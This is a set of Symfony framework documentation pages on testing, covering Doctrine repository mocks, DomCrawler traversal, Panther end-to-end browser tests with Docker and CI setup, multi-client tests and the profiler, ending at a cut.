=================================

.. seealso::

    The :ref:`main Testing guide <testing-databases>` describes how to use
    and set-up a database for your automated tests. The contents of this
    article show ways to test your Doctrine repositories.

Mocking a Doctrine Repository in Unit Tests
-------------------------------------------

**Unit testing Doctrine repositories is not recommended**. Repositories are
meant to be tested against a real database connection. However, in case you
still need to do this, look at the following example.

Suppose the class you want to test looks like this::

    // src/Salary/SalaryCalculator.php
    namespace App\Salary;

    use App\Entity\Employee;
    use Doctrine\ORM\EntityManager;

    class SalaryCalculator
    {
        public function __construct(
            private EntityManager $entityManager,
        ) {
        }

        public function calculateTotalSalary(int $id): int
        {
            $employeeRepository = $this->entityManager
                ->getRepository(Employee::class);
            $employee = $employeeRepository->find($id);

            return $employee->getSalary() + $employee->getBonus();
        }
    }

Since the ``EntityManagerInterface`` gets injected into the class through the
constructor, you can pass a mock object within a test::

    // tests/Salary/SalaryCalculatorTest.php
    namespace App\Tests\Salary;

    use App\Entity\Employee;
    use App\Salary\SalaryCalculator;
    use Doctrine\ORM\EntityManager;
    use Doctrine\ORM\EntityRepository;
    use PHPUnit\Framework\TestCase;

    class SalaryCalculatorTest extends TestCase
    {
        public function testCalculateTotalSalary(): void
        {
            $employee = new Employee();
            $employee->setSalary(1000);
            $employee->setBonus(1100);

            // Now, mock the repository so it returns the mock of the employee
            $employeeRepository = $this->createMock(EntityRepository::class);
            $employeeRepository->expects($this->any())
                ->method('find')
                ->willReturn($employee);

            // Last, mock the EntityManager to return the mock of the repository
            // (this is not needed if the class being tested injects the
            // repository it uses instead of the entire entity manager)
            $entityManager = $this->createMock(EntityManager::class);
            $entityManager->expects($this->any())
                ->method('getRepository')
                ->willReturn($employeeRepository);

            $salaryCalculator = new SalaryCalculator($entityManager);
            $this->assertEquals(2100, $salaryCalculator->calculateTotalSalary(1));
        }
    }

In this example, you are building the mocks from the inside out, first creating
the employee which gets returned by the ``Repository``, which itself gets
returned by the ``EntityManager``. This way, no real class is involved in
testing.

Functional Testing of A Doctrine Repository
-------------------------------------------

In :ref:`functional tests <functional-tests>` you'll make queries to the
database using the actual Doctrine repositories, instead of mocking them. To do
so, get the entity manager via the service container as follows::

    // tests/Repository/ProductRepositoryTest.php
    namespace App\Tests\Repository;

    use App\Entity\Product;
    use Doctrine\ORM\EntityManager;
    use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;

    class ProductRepositoryTest extends KernelTestCase
    {
        private ?EntityManager $entityManager;

        protected function setUp(): void
        {
            $kernel = self::bootKernel();

            $this->entityManager = $kernel->getContainer()
                ->get('doctrine')
                ->getManager();
        }

        public function testSearchByName(): void
        {
            $product = $this->entityManager
                ->getRepository(Product::class)
                ->findOneBy(['name' => 'Priceless widget'])
            ;

            $this->assertSame(14.50, $product->getPrice());
        }

        protected function tearDown(): void
        {
            parent::tearDown();

            // doing this is recommended to avoid memory leaks
            $this->entityManager->close();
            $this->entityManager = null;
        }
    }
The DOM Crawler
===============

A Crawler instance is returned each time you make a request with the Client.
It allows you to traverse HTML or XML documents: select nodes, find links
and forms, and retrieve attributes or contents.

Traversing
----------

Like jQuery, the Crawler has methods to traverse the DOM of an HTML/XML
document. For example, the following finds all ``input[type=submit]`` elements,
selects the last one on the page, and then selects its immediate parent element::

    $newCrawler = $crawler->filter('input[type=submit]')
        ->last()
        ->parents()
        ->first()
    ;

Many other methods are also available:

``filter('h1.title')``
    Nodes that match the CSS selector.
``filterXpath('h1')``
    Nodes that match the XPath expression.
``eq(1)``
    Node for the specified index.
``first()``
    First node.
``last()``
    Last node.
``siblings()``
    Siblings.
``nextAll()``
    All following siblings.
``previousAll()``
    All preceding siblings.
``parents()``
    Returns the parent nodes.
``children()``
    Returns children nodes.
``reduce($lambda)``
    Nodes for which the callable does not return false.

Since each of these methods returns a new ``Crawler`` instance, you can
narrow down your node selection by chaining the method calls::

    $crawler
        ->filter('h1')
        ->reduce(function ($node, int $i): bool {
            if (!$node->attr('class')) {
                return false;
            }

            return true;
        })
        ->first()
    ;

.. tip::

    Use the ``count()`` function to get the number of nodes stored in a Crawler:
    ``count($crawler)``

Extracting Information
----------------------

The Crawler can extract information from the nodes::

    // returns the attribute value for the first node
    $crawler->attr('class');

    // returns the node value for the first node
    $crawler->text();

    // returns the default text if the node does not exist
    $crawler->text('Default text content');

    // pass TRUE as the second argument of text() to remove all extra white spaces, including
    // the internal ones (e.g. "  foo\n  bar    baz \n " is returned as "foo bar baz")
    $crawler->text(null, true);

    // extracts an array of attributes for all nodes
    // (_text returns the node value)
    // returns an array for each element in crawler,
    // each with the value and href
    $info = $crawler->extract(['_text', 'href']);

    // executes a lambda for each node and return an array of results
    $data = $crawler->each(function ($node, int $i): string {
        return $node->attr('href');
    });
End-to-End Testing
==================

    The Panther component allows to drive a real web browser with PHP to create
    end-to-end tests.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/panther

.. include:: /components/require_autoload.rst.inc

Introduction
------------

End to end tests are a special type of application tests that
simulate a real user interacting with your application. They are
typically used to test the user interface (UI) of your application
and the effects of these interactions (e.g. when I click on this button, a mail
must be sent). The difference with functional tests detailed above is
that End-to-End tests use a real browser instead of a simulated one. This
browser can run in headless mode (without a graphical interface) or not.
The first option is convenient for running tests in a Continuous Integration
(CI), while the second one is useful for debugging purpose.

This is the purpose of Panther, a component that provides a real browser
to run your tests. Here are a few things that make Panther special, compared
to other testing tools provided by Symfony:

* Possibility to take screenshots of the browser at any time during the test
* The JavaScript code contained in webpages is executed
* Panther supports everything that Chrome (or Firefox) implements
* Convenient way to test real-time applications (e.g. WebSockets, Server-Sent Events
  with Mercure, etc.)

Installing Web Drivers
~~~~~~~~~~~~~~~~~~~~~~

Panther uses the WebDriver protocol to control the browser used to crawl
websites. On all systems, you can use `dbrekelmans/browser-driver-installer`_
to install ChromeDriver and geckodriver locally:

.. code-block:: terminal

    $ composer require --dev dbrekelmans/bdi

    $ vendor/bin/bdi detect drivers

Panther will detect and use automatically drivers stored in the ``drivers/`` directory
of your project when installing them manually. You can download `ChromeDriver`_
for Chromium or Chromeand `GeckoDriver`_ for Firefox and put them anywhere in
your ``PATH`` or in the ``drivers/`` directory of your project.

Alternatively, you can use the package manager of your operating system
to install them:

.. code-block:: terminal

    # Ubuntu
    $ apt-get install chromium-chromedriver firefox-geckodriver

    # MacOS, using Homebrew
    $ brew install chromedriver geckodriver

    # Windows, using Chocolatey
    $ choco install chromedriver selenium-gecko-driver

.. _panther_phpunit-extension:

Registering The PHPUnit Extension
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you intend to use Panther to test your application, it is strongly recommended
to register the Panther PHPUnit extension. While not strictly mandatory, this
extension dramatically improves the testing experience by boosting the performance
and allowing to use the :ref:`interactive debugging mode <panther_interactive-mode>`.

When using the extension in conjunction with the ``PANTHER_ERROR_SCREENSHOT_DIR``
environment variable, tests using the Panther client that fail or error (after the
client is created) will automatically get a screenshot taken to help debugging.

To register the Panther extension, add the following lines to ``phpunit.xml.dist``:

.. code-block:: xml

    <!-- phpunit.xml.dist -->
    <extensions>
        <extension class="Symfony\Component\Panther\ServerExtension"/>
    </extensions>

Without the extension, the web server used by Panther to serve the application
under test is started on demand and stopped when ``tearDownAfterClass()`` is called.
On the other hand, when the extension is registered, the web server will be stopped
only after the very last test.

Usage
-----

Here is an example of a snippet that uses Panther to test an application::

    use Symfony\Component\Panther\Client;

    $client = Client::createChromeClient();
    // alternatively, create a Firefox client
    $client = Client::createFirefoxClient();

    $client->request('GET', 'https://api-platform.com');
    $client->clickLink('Getting started');

    // wait for an element to be present in the DOM, even if hidden
    $crawler = $client->waitFor('#installing-the-framework');
    // you can also wait for an element to be visible
    $crawler = $client->waitForVisibility('#installing-the-framework');

    // get the text of an element thanks to the query selector syntax
    echo $crawler->filter('#installing-the-framework')->text();
    // take a screenshot of the current page
    $client->takeScreenshot('screen.png');

.. note::

    According to the specification, WebDriver implementations return only the
    **displayed** text by default. When you filter on a ``head`` tag (like
    ``title``), the method ``text()`` returns an empty string. Use the
    ``html()`` method to get the complete contents of the tag, including the
    tag itself.

Creating a TestCase
~~~~~~~~~~~~~~~~~~~

The ``PantherTestCase`` class allows you to write end-to-end tests. It
automatically starts your app using the built-in PHP web server and let
you crawl it using Panther. To provide all the testing tools you're used
to, it extends `PHPUnit`_'s ``TestCase``.

If you are testing a Symfony application, ``PantherTestCase`` automatically
extends the :class:`Symfony\\Bundle\\FrameworkBundle\\Test\\WebTestCase` class.
It means you can create functional tests, which can directly execute the
kernel of your application and access all your existing services.
In this case, you can use
:ref:`all crawler test assertions <testing-application-assertions>`
provided by Symfony with Panther.

Here is an example of a ``PantherTestCase``::

    namespace App\Tests;

    use Symfony\Component\Panther\PantherTestCase;

    class HomepageTest extends PantherTestCase
    {
        public function testMyApp(): void
        {
            // your app is automatically started using the built-in web server
            $client = static::createPantherClient();
            $client->request('GET', '/home');

            // use any PHPUnit assertion, including the ones provided by Symfony...
            $this->assertPageTitleContains('My Title');
            $this->assertSelectorTextContains('#main', 'My body');

            // ... or the one provided by Panther
            $this->assertSelectorIsEnabled('.search');
            $this->assertSelectorIsDisabled('[type="submit"]');
            $this->assertSelectorIsVisible('.errors');
            $this->assertSelectorIsNotVisible('.loading');
            $this->assertSelectorAttributeContains('.price', 'data-old-price', '42');
            $this->assertSelectorAttributeNotContains('.price', 'data-old-price', '36');

            // ...
        }
    }

Panther client comes with methods that wait until some asynchronous process
finishes::

    namespace App\Tests;

    use Symfony\Component\Panther\PantherTestCase;

    class HomepageTest extends PantherTestCase
    {
        public function testMyApp(): void
        {
            // ...

            // wait for element to be attached to the DOM
            $client->waitFor('.popin');

            // wait for element to be removed from the DOM
            $client->waitForStaleness('.popin');

            // wait for element of the DOM to become visible
            $client->waitForVisibility('.loader');

            // wait for element of the DOM to become hidden
            $client->waitForInvisibility('.loader');

            // wait for text to be inserted in the element content
            $client->waitForElementToContain('.total', '25 €');

            // wait for text to be removed from the element content
            $client->waitForElementToNotContain('.promotion', '5%');

            // wait for the button to become enabled
            $client->waitForEnabled('[type="submit"]');

            // wait for  the button to become disabled
            $client->waitForDisabled('[type="submit"]');

            // wait for the attribute to contain content
            $client->waitForAttributeToContain('.price', 'data-old-price', '25 €');

            // wait for the attribute to not contain content
            $client->waitForAttributeToNotContain('.price', 'data-old-price', '25 €');
        }
    }

Finally, you can also make assertions on things that will happen in the
future::

    namespace App\Tests;

    use Symfony\Component\Panther\PantherTestCase;

    class HomepageTest extends PantherTestCase
    {
        public function testMyApp(): void
        {
            // ...

            // element will be attached to the DOM
            $this->assertSelectorWillExist('.popin');

            // element will be removed from the DOM
            $this->assertSelectorWillNotExist('.popin');

            // element will be visible
            $this->assertSelectorWillBeVisible('.loader');

            // element will not be visible
            $this->assertSelectorWillNotBeVisible('.loader');

            // text will be inserted in the element content
            $this->assertSelectorWillContain('.total', '€25');

            // text will be removed from the element content
            $this->assertSelectorWillNotContain('.promotion', '5%');

            // button will be enabled
            $this->assertSelectorWillBeEnabled('[type="submit"]');

            // button will be disabled
            $this->assertSelectorWillBeDisabled('[type="submit"]');

            // attribute will contain content
            $this->assertSelectorAttributeWillContain('.price', 'data-old-price', '€25');

            // attribute will not contain content
            $this->assertSelectorAttributeWillNotContain('.price', 'data-old-price', '€25');
        }
    }

You can then run this test by using PHPUnit, like you would do for any other
test:

.. code-block:: terminal

    $ ./vendor/bin/phpunit tests/HomepageTest.php

When writing end-to-end tests, you should keep in mind that they are
slower than other tests. If you need to check that the WebDriver connection
is still active during long-running tests, you can use the
``Client::ping()`` method which returns a boolean depending on the
connection status.

Advanced Usage
--------------

Changing The Hostname and the Port Of The Web Server
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you want to change the host and/or the port used by the built-in web server,
pass the ``hostname`` and ``port`` to the ``$options`` parameter of the
``createPantherClient()`` method::

    $client = self::createPantherClient([
        'hostname' => 'example.com', // defaults to 127.0.0.1
        'port' => 8080, // defaults to 9080
    ]);

Using Browser-Kit Clients
~~~~~~~~~~~~~~~~~~~~~~~~~

Panther also gives access to other BrowserKit-based implementations of
``Client`` and ``Crawler``. Unlike Panther's native client, these alternative
clients don't support JavaScript, CSS and screenshot capturing, but are way
faster. Two alternative clients are available:

* The first directly manipulates the Symfony kernel provided by
  ``WebTestCase``. It is the fastest client available, but it
  is only available for Symfony applications.
* The second leverages :class:`Symfony\\Component\\BrowserKit\\HttpBrowser`.
  It is an intermediate between Symfony's kernel and Panther's test clients.
  ``HttpBrowser`` sends real HTTP requests using the
  :doc:`HttpClient component </http_client>`. It is fast and is able to browse
  any webpage, not only the ones of the application under test.
  However, HttpBrowser doesn't support JavaScript and other advanced features
  because it is entirely written in PHP. This one can be used in any PHP
  application.

Because all clients implement the exact same API, you can switch from one to
another just by calling the appropriate factory method, resulting in a good
trade-off for every single test case: if JavaScript is needed or not, if an
authentication against an external SSO has to be done, etc.

Here is how to retrieve instances of these clients::

    namespace App\Tests;

    use Symfony\Component\Panther\Client;
    use Symfony\Component\Panther\PantherTestCase;

    class AppTest extends PantherTestCase
    {
        public function testMyApp(): void
        {
            // retrieve an existing client
            $symfonyClient = static::createClient();
            $httpBrowserClient = static::createHttpBrowserClient();
            $pantherClient = static::createPantherClient();
            $firefoxClient = static::createPantherClient(['browser' => static::FIREFOX]);

            // create a custom client
            $customChromeClient = Client::createChromeClient(null, null, [], 'https://example.com');
            $customFirefoxClient = Client::createFirefoxClient(null, null, [], 'https://example.com');
            $customSeleniumClient = Client::createSeleniumClient('http://127.0.0.1:4444/wd/hub', null, 'https://example.com');

            // if you are testing a Symfony app, you also have access to the kernel
            $kernel = static::createKernel();

            // ...
        }
    }

.. note::

    When initializing a custom client, the integrated web server **is not** started
    automatically. Use ``PantherTestCase::startWebServer()`` or the ``WebServerManager``
    class if you want to start it manually.

Testing Real-Time Applications
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Panther provides a convenient way to test applications with real-time
capabilities which use `Mercure`_, `WebSocket`_ and similar technologies.

The ``PantherTestCase::createAdditionalPantherClient()`` method can create
additional, isolated browsers which can interact with other ones. For instance,
this can be useful to test a chat application having several users
connected simultaneously::

    use Symfony\Component\Panther\PantherTestCase;

    class ChatTest extends PantherTestCase
    {
        public function testChat(): void
        {
            $client1 = self::createPantherClient();
            $client1->request('GET', '/chat');

            // connect a 2nd user using an isolated browser
            $client2 = self::createAdditionalPantherClient();
            $client2->request('GET', '/chat');
            $client2->submitForm('Post message', ['message' => 'Hi folks !']);

            // wait for the message to be received by the first client
            $client1->waitFor('.message');

            // Symfony Assertions are *always* executed in the primary browser
            $this->assertSelectorTextContains('.message', 'Hi folks !');
        }
    }

Accessing Browser Console Logs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If needed, you can use Panther to access the content of the console::

    use Symfony\Component\Panther\PantherTestCase;

    class ConsoleTest extends PantherTestCase
    {
        public function testConsole(): void
        {
            $client = self::createPantherClient(
                [],
                [],
                [
                    'capabilities' => [
                        'goog:loggingPrefs' => [
                            'browser' => 'ALL', // calls to console.* methods
                            'performance' => 'ALL', // performance data
                        ],
                    ],
                ]
            );

            $client->request('GET', '/');

            $consoleLogs = $client->getWebDriver()->manage()->getLog('browser');
            $performanceLogs = $client->getWebDriver()->manage()->getLog('performance'); // performance logs
        }
    }

Passing Arguments to ChromeDriver
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If needed, you can configure `the arguments`_ to pass to the ``chromedriver`` binary::

    use Symfony\Component\Panther\PantherTestCase;

    class MyTest extends PantherTestCase
    {
        public function testLogging(): void
        {
            $client = self::createPantherClient(
                [],
                [],
                [
                    'chromedriver_arguments' => [
                        '--log-path=myfile.log',
                        '--log-level=DEBUG'
                    ],
                ]
            );

            $client->request('GET', '/');
        }
    }

Using a Proxy
~~~~~~~~~~~~~

To use a proxy server, you have to set the ``PANTHER_CHROME_ARGUMENTS``:

.. code-block:: bash

    # .env.test
    PANTHER_CHROME_ARGUMENTS='--proxy-server=socks://127.0.0.1:9050'

Accepting Self-Signed SSL Certificates
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

To force Chrome to accept invalid and self-signed certificates, you can set the
following environment variable: ``PANTHER_CHROME_ARGUMENTS='--ignore-certificate-errors'``.

.. caution::

    This option is insecure, use it only for testing in development environments,
    never in production (e.g. for web crawlers).

For Firefox, instantiate the client like this, you can do this at client
creation::

    $client = Client::createFirefoxClient(null, null, ['capabilities' => ['acceptInsecureCerts' => true]]);

Using An External Web Server
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sometimes, it's convenient to reuse an existing web server configuration
instead of starting the built-in PHP one. To do so, set the
``external_base_uri`` option when creating your client::

    namespace App\Tests;

    use Symfony\Component\Panther\PantherTestCase;

    class E2eTest extends PantherTestCase
    {
        public function testMyApp(): void
        {
            $pantherClient = static::createPantherClient(['external_base_uri' => 'https://localhost']);

            // ...
        }
    }

.. note::

    When using an external web server, Panther will not start the built-in
    PHP web server.

Having a Multi-domain Application
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

It happens that your PHP/Symfony application might serve several different
domain names. As Panther saves the Client in memory between tests to improve
performance, you will have to run your tests in separate
processes if you write several tests using Panther for different domain names.

To do so, you can use the native ``@runInSeparateProcess`` PHPUnit annotation.
Here is an example using the ``external_base_uri`` option to determine the
domain name used by the Client when using separate processes::

    // tests/FirstDomainTest.php
    namespace App\Tests;

    use Symfony\Component\Panther\PantherTestCase;

    class FirstDomainTest extends PantherTestCase
    {
        /**
         * @runInSeparateProcess
         */
        public function testMyApp(): void
        {
            $pantherClient = static::createPantherClient([
                'external_base_uri' => 'http://mydomain.localhost:8000',
            ]);

            // ...
        }
    }

    // tests/SecondDomainTest.php
    namespace App\Tests;

    use Symfony\Component\Panther\PantherTestCase;

    class SecondDomainTest extends PantherTestCase
    {
        /**
         * @runInSeparateProcess
         */
        public function testMyApp(): void
        {
            $pantherClient = static::createPantherClient([
                'external_base_uri' => 'http://anotherdomain.localhost:8000',
            ]);

            // ...
        }
    }

Usage With Other Testing Tools
------------------------------

If you want to use Panther with other testing tools like `LiipFunctionalTestBundle`_
or if you just need to use a different base class, you can use the
``Symfony\Component\Panther\PantherTestCaseTrait`` to enhance your existing
test-infrastructure with some Panther mechanisms::

    namespace App\Tests\Controller;

    use Liip\FunctionalTestBundle\Test\WebTestCase;
    use Symfony\Component\Panther\PantherTestCaseTrait;

    class DefaultControllerTest extends WebTestCase
    {
        use PantherTestCaseTrait;

        public function testWithFixtures(): void
        {
            $this->loadFixtures([]); // load your fixtures
            $client = self::createPantherClient(); // create your panther client

            $client->request('GET', '/');

            // ...
        }
    }

Configuring Panther Through Environment Variables
-------------------------------------------------

The following environment variables can be set to change some Panther's
behavior:

``PANTHER_NO_HEADLESS``
    Disable the browser's headless mode (will display the testing window, useful to debug)
``PANTHER_WEB_SERVER_DIR``
    Change the project's document root (default to ``./public/``, relative paths **must start** by ``./``)
``PANTHER_WEB_SERVER_PORT``
    Change the web server's port (default to ``9080``)
``PANTHER_WEB_SERVER_ROUTER``
    Use a web server router script which is run at the start of each HTTP request
``PANTHER_EXTERNAL_BASE_URI``
    Use an external web server (the PHP built-in web server will not be started)
``PANTHER_APP_ENV``
    Override the ``APP_ENV`` variable passed to the web server running the PHP app
``PANTHER_ERROR_SCREENSHOT_DIR``
    Set a base directory for your failure/error screenshots (e.g. ``./var/error-screenshots``)
``PANTHER_DEVTOOLS``
    Toggle the browser's dev tools (default ``enabled``, useful to debug)
``PANTHER_ERROR_SCREENSHOT_ATTACH``
    Add screenshots mentioned above to test output in junit attachment format

Chrome Specific Environment Variables
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

``PANTHER_NO_SANDBOX``
    Disable `Chrome's sandboxing`_ (unsafe, but allows to use Panther in containers)
``PANTHER_CHROME_ARGUMENTS``
    Customize Chrome arguments. You need to set ``PANTHER_NO_HEADLESS`` to fully customize
``PANTHER_CHROME_BINARY``
    To use another ``google-chrome`` binary

Firefox Specific Environment Variables
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

``PANTHER_FIREFOX_ARGUMENTS``
    Customize Firefox arguments. You need to set ``PANTHER_NO_HEADLESS`` to fully customize
``PANTHER_FIREFOX_BINARY``
    To use another ``firefox`` binary

.. _panther_interactive-mode:

Interactive Mode
----------------

Panther can make a pause in your tests suites after a failure.
Thanks to this break time, you can investigate the encountered problem through
the web browser. To enable this mode, you need the ``--debug`` PHPUnit option
without the headless mode:

.. code-block:: terminal

    $ PANTHER_NO_HEADLESS=1 bin/phpunit --debug

    Test 'App\AdminTest::testLogin' started
    Error: something is wrong.

    Press enter to continue...

To use the interactive mode, the
:ref:`PHPUnit extension <panther_phpunit-extension>` has to be registered.

Docker Integration
------------------

Here is a minimal Docker image that can run Panther with both Chrome and
Firefox:

.. code-block:: dockerfile

    FROM php:alpine

    # Chromium and ChromeDriver
    ENV PANTHER_NO_SANDBOX 1
    # Not mandatory, but recommended
    ENV PANTHER_CHROME_ARGUMENTS='--disable-dev-shm-usage'
    RUN apk add --no-cache chromium chromium-chromedriver

    # Firefox and GeckoDriver (optional)
    ARG GECKODRIVER_VERSION=0.28.0
    RUN apk add --no-cache firefox libzip-dev; \
        docker-php-ext-install zip
    RUN wget -q https://github.com/mozilla/geckodriver/releases/download/v$GECKODRIVER_VERSION/geckodriver-v$GECKODRIVER_VERSION-linux64.tar.gz; \
        tar -zxf geckodriver-v$GECKODRIVER_VERSION-linux64.tar.gz -C /usr/bin; \
        rm geckodriver-v$GECKODRIVER_VERSION-linux64.tar.gz

You can then build and run your image:

.. code-block:: bash

    $ docker build . -t myproject
    $ docker run -it -v "$PWD":/srv/myproject -w /srv/myproject myproject bin/phpunit

Integrating Panther In Your CI
------------------------------

Github Actions
~~~~~~~~~~~~~~

Panther works out of the box with `GitHub Actions`_.
Here is a minimal ``.github/workflows/panther.yaml`` file to run Panther tests:

.. code-block:: yaml

    name: Run Panther tests

    on: [ push, pull_request ]

    jobs:
      tests:

        runs-on: ubuntu-latest

        steps:
          - uses: actions/checkout@v4
          - uses: "ramsey/composer-install@v2"

          - name: Install dependencies
            run: composer install -q --no-ansi --no-interaction --no-scripts --no-progress --prefer-dist

          - name: Run test suite
            run: bin/phpunit

Travis CI
~~~~~~~~~

Panther will work out of the box with `Travis CI`_ if you add the Chrome addon.
Here is a minimal ``.travis.yaml`` file to run Panther tests:

.. code-block:: yaml

    language: php
    addons:
      # If you don't use Chrome, or Firefox, remove the corresponding line
      chrome: stable
      firefox: latest

    php:
      - 8.0

    script:
      - bin/phpunit

Gitlab CI
~~~~~~~~~

Here is a minimal ``.gitlab-ci.yaml`` file to run Panther tests
with `Gitlab CI`_:

.. code-block:: yaml

    image: ubuntu

    before_script:
      - apt-get update
      - apt-get install software-properties-common -y
      - ln -sf /usr/share/zoneinfo/Europe/Paris /etc/localtime
      - apt-get install curl wget php php-cli php8.1 php8.1-common php8.1-curl php8.1-intl php8.1-xml php8.1-opcache php8.1-mbstring php8.1-zip libfontconfig1 fontconfig libxrender-dev libfreetype6 libxrender1 zlib1g-dev xvfb chromium-chromedriver firefox-geckodriver -y -qq
      - export PANTHER_NO_SANDBOX=1
      - export PANTHER_WEB_SERVER_PORT=9080
      - php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"
      - php composer-setup.php --install-dir=/usr/local/bin --filename=composer
      - php -r "unlink('composer-setup.php');"
      - composer install -q --no-ansi --no-interaction --no-scripts --no-progress --prefer-dist

    test:
      script:
        - bin/phpunit

AppVeyor
~~~~~~~~

Panther will work out of the box with `AppVeyor`_ as long as Google Chrome
is installed. Here is a minimal ``appveyor.yaml`` file to run Panther tests:

.. code-block:: yaml

    build: false
    platform: x86
    clone_folder: c:\projects\myproject

    cache:
      - '%LOCALAPPDATA%\Composer\files'

    install:
      - ps: Set-Service wuauserv -StartupType Manual
      - cinst -y php composer googlechrome chromedriver firfox selenium-gecko-driver
      - refreshenv
      - cd c:\tools\php80
      - copy php.ini-production php.ini /Y
      - echo date.timezone="UTC" >> php.ini
      - echo extension_dir=ext >> php.ini
      - echo extension=php_openssl.dll >> php.ini
      - echo extension=php_mbstring.dll >> php.ini
      - echo extension=php_curl.dll >> php.ini
      - echo memory_limit=3G >> php.ini
      - cd %APPVEYOR_BUILD_FOLDER%
      - composer install -q --no-ansi --no-interaction --no-scripts --no-progress --prefer-dist

    test_script:
      - cd %APPVEYOR_BUILD_FOLDER%
      - php bin\phpunit

Known Limitations and Troubleshooting
-------------------------------------

The following features are not currently supported:

* Crawling XML documents (only HTML is supported)
* Updating existing documents (browsers are mostly used to consume data, not to create webpages)
* Setting form values using the multidimensional PHP array syntax
* Methods returning an instance of ``\DOMElement`` (because this library uses ``WebDriverElement`` internally)
* Selecting invalid choices in select

Also, there is a known issue if you are using Bootstrap 5. It implements a
scrolling effect, which tends to mislead Panther. To fix this, we advise you to
deactivate this effect by setting the Bootstrap 5 ``$enable-smooth-scroll``
variable to ``false`` in your style file:

.. code-block:: scss

    $enable-smooth-scroll: false;

Additional Documentation
------------------------

Since Panther implements the API of popular libraries, you can find even more
documentation:

* For the ``Client`` class, by reading the
  :doc:`BrowserKit component </components/browser_kit>` page
* For the ``Crawler`` class, by reading the
  :doc:`DomCrawler component </components/dom_crawler>` page
* For WebDriver, by reading the `PHP WebDriver documentation`_

.. _`dbrekelmans/browser-driver-installer`: https://github.com/dbrekelmans/browser-driver-installer
.. _`ChromeDriver`: https://sites.google.com/chromium.org/driver/
.. _`GeckoDriver`: https://github.com/mozilla/geckodriver
.. _`PHPUnit`: https://phpunit.de/
.. _`Mercure`: https://mercure.rocks/
.. _`WebSocket`: https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API
.. _`the arguments`: https://chromedriver.chromium.org/logging#TOC-All-languages
.. _`PHP WebDriver documentation`: https://github.com/php-webdriver/php-webdriver
.. _`Chrome's sandboxing`: https://chromium.googlesource.com/chromium/src/+/b4730a0c2773d8f6728946013eb812c6d3975bec/docs/design/sandbox.md
.. _`GitHub Actions`: https://help.github.com/en/actions
.. _`Travis CI`: https://travis-ci.com/
.. _`Gitlab CI`: https://docs.gitlab.com/ee/ci/
.. _`AppVeyor`: https://www.appveyor.com/
.. _`LiipFunctionalTestBundle`: https://github.com/liip/LiipFunctionalTestBundle
How to Simulate HTTP Authentication in a Functional Test
========================================================

.. caution::

    Starting from Symfony 5.1, a ``loginUser()`` method was introduced to
    ease testing secured applications. See :ref:`testing_logging_in_users`
    for more information about this.

    If you are still using an older version of Symfony, view
    `previous versions of this article`_ for information on how to simulate
    HTTP authentication.

.. _previous versions of this article: https://symfony.com/doc/5.0/testing/http_authentication.html
How to Test the Interaction of several Clients
==============================================

If you need to simulate an interaction between different clients (think of a
chat for instance), create several clients::

    // ...
    use Symfony\Component\HttpFoundation\Response;

    $harry = static::createClient();
    $sally = static::createClient();

    $harry->request('POST', '/say/sally/Hello');
    $sally->request('GET', '/messages');

    $this->assertEquals(Response::HTTP_CREATED, $harry->getResponse()->getStatusCode());
    $this->assertRegExp('/Hello/', $sally->getResponse()->getContent());

This works except when your code maintains a global state or if it depends on
a third-party library that has some kind of global state. In such a case, you
can insulate your clients::

    // ...
    use Symfony\Component\HttpFoundation\Response;

    $harry = static::createClient();
    $sally = static::createClient();

    $harry->insulate();
    $sally->insulate();

    $harry->request('POST', '/say/sally/Hello');
    $sally->request('GET', '/messages');

    $this->assertEquals(Response::HTTP_CREATED, $harry->getResponse()->getStatusCode());
    $this->assertRegExp('/Hello/', $sally->getResponse()->getContent());

Insulated clients transparently run their requests in a dedicated and
clean PHP process, thus avoiding any side effects.

.. tip::

    As an insulated client is slower, you can keep one client in the main
    process, and insulate the other ones.

.. caution::

    Insulating tests requires some serializing and unserializing operations. If
    your test includes data that can't be serialized, such as file streams when
    using the ``UploadedFile`` class, you'll see an exception about
    *"serialization is not allowed"*. This is a technical limitation of PHP, so
    the only solution is to disable insulation for those tests.
How to Use the Profiler in a Functional Test
============================================

It's highly recommended that a functional test only tests the Response. But if
you write functional tests that monitor your production servers, you might
want to write tests on the profiling data as it gives you a great way to check
various things and enforce some metrics.

.. _speeding-up-tests-by-not-collecting-profiler-data:

Enabling the Profiler in Tests
------------------------------

Collecting data with :doc:`the Symfony Profiler </profiler>` can slow down your
tests significantly. That's why Symfony disables it by default:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/test/web_profiler.yaml

        # ...
        framework:
            profiler: { enabled: true, collect: false }

    .. code-block:: xml

        <!-- config/packages/test/web_profiler.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd
                        http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <!-- ... -->

            <framework:config>
                <framework:profiler enabled="true" collect="false"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/test/web_profiler.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $framework->profiler()
                ->enabled(true)
                ->collect(false)
            ;
        };

Setting ``collect`` to ``true`` enables the profiler for all tests. However, if
you need the profiler only in a few tests, you can keep it disabled globally and
enable the profiler individually on each test by calling
``$client->enableProfiler()``.

Testing the Profiler Information
--------------------------------

The data collected by the Symfony Profiler can be used to check the number of
database calls, the time spent in the framework, etc. All this information is
provided by the collectors obtained through the ``$client->getProfile()`` call::

